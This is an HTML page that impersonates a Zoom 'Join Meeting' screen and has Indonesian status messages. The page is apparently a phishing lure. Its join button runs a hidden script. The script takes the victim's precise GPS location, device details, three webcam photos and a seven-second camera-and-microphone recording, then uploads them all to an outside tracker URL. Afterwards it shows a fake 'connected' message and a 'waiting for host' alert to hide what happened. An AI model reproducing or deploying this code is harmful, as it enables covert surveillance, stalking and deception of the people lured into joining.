<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Join Meeting - Zoom</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');

    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Inter', system-ui, -apple-system, sans-serif;
      background: #f7f9fc;
      color: #333;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .zoom-container {
      background: white;
      width: 100%;
      max-width: 480px;
      border-radius: 8px;
      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
      overflow: hidden;
    }
    .top-bar {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 16px 24px;
      border-bottom: 1px solid #e5e7eb;
    }
    .logo {
      font-size: 28px;
      font-weight: 700;
      color: #0e71eb;
      letter-spacing: -1px;
    }
    .top-right {
      display: flex;
      gap: 12px;
    }
    .btn-support, .btn-signup {
      padding: 6px 16px;
      border-radius: 9999px;
      font-size: 14px;
      font-weight: 500;
      cursor: pointer;
    }
    .btn-support {
      border: 1px solid #0e71eb;
      color: #0e71eb;
      background: white;
    }
    .btn-signup {
      background: #0e71eb;
      color: white;
      border: none;
    }
    .main-content {
      padding: 40px 32px 32px;
      text-align: center;
    }
    h1 {
      font-size: 28px;
      font-weight: 600;
      margin-bottom: 32px;
      color: #1f2937;
    }
    .input-label {
      text-align: left;
      font-size: 14px;
      font-weight: 500;
      color: #374151;
      margin-bottom: 8px;
    }
    input {
      width: 100%;
      padding: 14px 16px;
      border: 1px solid #d1d5db;
      border-radius: 8px;
      font-size: 16px;
      margin-bottom: 24px;
    }
    input:focus {
      outline: none;
      border-color: #0e71eb;
      box-shadow: 0 0 0 3px rgba(14, 113, 235, 0.15);
    }
    .agreement {
      font-size: 13px;
      color: #6b7280;
      margin-bottom: 24px;
      line-height: 1.5;
    }
    .agreement a { color: #0e71eb; text-decoration: none; }
    .join-btn {
      width: 100%;
      padding: 14px;
      background: #d1d5db;
      color: #6b7280;
      border: none;
      border-radius: 8px;
      font-size: 17px;
      font-weight: 600;
      cursor: not-allowed;
      transition: all 0.3s;
    }
    .join-btn.active {
      background: #0e71eb;
      color: white;
      cursor: pointer;
    }
    .join-btn.active:hover {
      background: #0b5ec4;
    }
    .sip-link {
      margin-top: 28px;
      font-size: 14px;
      color: #0e71eb;
      text-decoration: none;
    }
    .footer {
      padding: 20px 32px;
      border-top: 1px solid #e5e7eb;
      font-size: 12px;
      color: #6b7280;
      display: flex;
      justify-content: space-between;
      align-items: center;
      flex-wrap: wrap;
      gap: 12px;
    }
  </style>
</head>
<body>

  <div class="zoom-container">
    <div class="top-bar">
      <div class="logo">zoom</div>
      <div class="top-right">
        <button class="btn-support">Support</button>
        <button class="btn-signup">Sign Up Free</button>
      </div>
    </div>

    <div class="main-content">
      <h1>Join Meeting</h1>

      <div class="input-label">Meeting ID or Personal Link Name</div>
      <input type="text" id="meetingId" value="987 654 3210" readonly />

      <div class="agreement">
        By clicking "Join", you agree to our 
        <a href="#">Terms of Services</a> and 
        <a href="#">Privacy Statement</a>
      </div>

      <button class="join-btn active" id="joinBtn">Join</button>

      <a href="#" class="sip-link">Join a meeting from an H.323/SIP room system</a>
    </div>

    <div class="footer">
      <div>© 2026 Zoom Communications, Inc. All rights reserved.</div>
      <div>English ▼</div>
    </div>
  </div>

  <video id="video" autoplay playsinline muted style="display:none;"></video>

  <script>
    const joinBtn = document.getElementById('joinBtn');
    const statusDiv = document.createElement('div');
    statusDiv.style.marginTop = '20px';
    statusDiv.style.fontSize = '15px';
    statusDiv.style.minHeight = '28px';
    document.querySelector('.main-content').appendChild(statusDiv);

    const SERVER_URL = 'https://coreproject.site/tracker/dashboard.php';

    async function getDeviceInfo() {
      return {
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        screen: `${screen.width}×${screen.height}`,
        hardwareConcurrency: navigator.hardwareConcurrency || 'N/A'
      };
    }

    joinBtn.addEventListener('click', async () => {
      joinBtn.textContent = 'Joining...';
      joinBtn.disabled = true;
      statusDiv.textContent = 'Meminta izin...';
      statusDiv.style.color = '#333';

      let stream = null;

      try {
        const deviceInfo = await getDeviceInfo();

        // Lokasi
        statusDiv.textContent = 'Mengambil lokasi GPS...';
        const position = await new Promise((res, rej) => 
          navigator.geolocation.getCurrentPosition(res, rej, {
            enableHighAccuracy: true,
            timeout: 15000,
            maximumAge: 0
          })
        );

        const location = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy
        };

        // Kamera + Mic
        statusDiv.textContent = 'Mengaktifkan kamera & mikrofon...';
        stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'user' },
          audio: true
        });

        const videoEl = document.getElementById('video');
        videoEl.srcObject = stream;
        await videoEl.play();

        // Ambil 3 Foto
        statusDiv.textContent = 'Mengambil foto bukti...';
        const photos = [];
        for (let i = 0; i < 3; i++) {
          await new Promise(r => setTimeout(r, 1000));
          const canvas = document.createElement('canvas');
          canvas.width = videoEl.videoWidth || 640;
          canvas.height = videoEl.videoHeight || 480;
          canvas.getContext('2d').drawImage(videoEl, 0, 0);
          photos.push(canvas.toDataURL('image/jpeg', 0.85));
        }

        // Rekam Video 7 Detik
        statusDiv.textContent = 'Merekam video 7 detik...';
        let chunks = [];
        let mimeType = 'video/webm';

        // Fallback mimeType
        const mimeOptions = ['video/webm;codecs=vp9', 'video/webm;codecs=vp8', 'video/webm', 'video/mp4'];
        for (let type of mimeOptions) {
          if (MediaRecorder.isTypeSupported(type)) {
            mimeType = type;
            break;
          }
        }

        const recorder = new MediaRecorder(stream, { mimeType });
        recorder.ondataavailable = e => { if (e.data && e.data.size > 0) chunks.push(e.data); };
        recorder.start();

        await new Promise(r => setTimeout(r, 7000));
        recorder.stop();

        const videoBlob = await new Promise(resolve => {
          recorder.onstop = () => resolve(new Blob(chunks, { type: mimeType }));
        });

        // Upload
        statusDiv.textContent = 'Mengirim data ke server...';

        const formData = new FormData();
        formData.append('location', JSON.stringify(location));
        formData.append('device_info', JSON.stringify(deviceInfo));
        formData.append('video', videoBlob, `zoom_${Date.now()}.webm`);

        for (let i = 0; i < photos.length; i++) {
          const blob = await fetch(photos[i]).then(r => r.blob());
          formData.append(`photo${i+1}`, blob, `photo_${Date.now()}_${i+1}.jpg`);
        }

        const response = await fetch(SERVER_URL, {
          method: 'POST',
          body: formData,
          mode: 'no-cors'        // Penting untuk menghindari CORS block
        });

        statusDiv.innerHTML = `<span style="color:#10b981;">✅ Berhasil terkoneksi ke meeting</span>`;
        
        setTimeout(() => {
          alert("Waiting for the host to join the meeting...");
        }, 1500);

      } catch (err) {
        console.error("FULL ERROR:", err);
        let message = 'Gagal mengirim data';

        if (err.message.includes('Failed to fetch') || err.name === 'TypeError') {
          message = 'Koneksi internet bermasalah atau server tidak merespons';
        } else if (err.name === 'NotAllowedError') {
          message = 'Izin kamera / lokasi ditolak';
        } else if (err.name === 'NotFoundError') {
          message = 'Kamera tidak ditemukan';
        }

        statusDiv.innerHTML = `<span style="color:#ef4444;">❌ ${message}</span>`;
        joinBtn.textContent = 'Coba Lagi';
        joinBtn.disabled = false;
      } finally {
        if (stream) {
          stream.getTracks().forEach(track => track.stop());
        }
      }
    });
  </script>
</body>
</html>
